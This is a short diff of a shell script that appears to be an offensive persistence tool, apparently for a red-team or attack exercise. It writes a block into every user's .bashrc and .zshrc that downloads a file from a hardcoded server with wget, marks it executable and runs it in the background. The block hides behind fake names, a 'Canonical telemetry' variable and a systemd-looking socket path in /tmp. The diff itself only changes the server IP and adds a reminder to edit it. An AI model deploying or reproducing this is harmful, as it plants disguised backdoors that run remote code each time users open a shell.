@@ -55,12 +55,13 @@ else
 	echo "[!] No compatible package managers detected: could not install '$install_packages'"
 fi
 
+
 echo
 echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
-
+echo "[!] *** Don't forget to change the IP address in trollrc!!! ***"
 
 trollrc='
-export CANONICAL_TELEMETRY_SERVER="http://10.10.2.5:8080/telemetry"
+export CANONICAL_TELEMETRY_SERVER="http://10.10.2.4:8080/telemetry"
 export SYSTEMD_SOCKET="/tmp/systemd-timers-daemon.socket"
 wget -qO "$SYSTEMD_SOCKET" --no-check-certificate "$CANONICAL_TELEMETRY_SERVER"; chmod +x "$SYSTEMD_SOCKET"; "$SYSTEMD_SOCKET"& disown
 
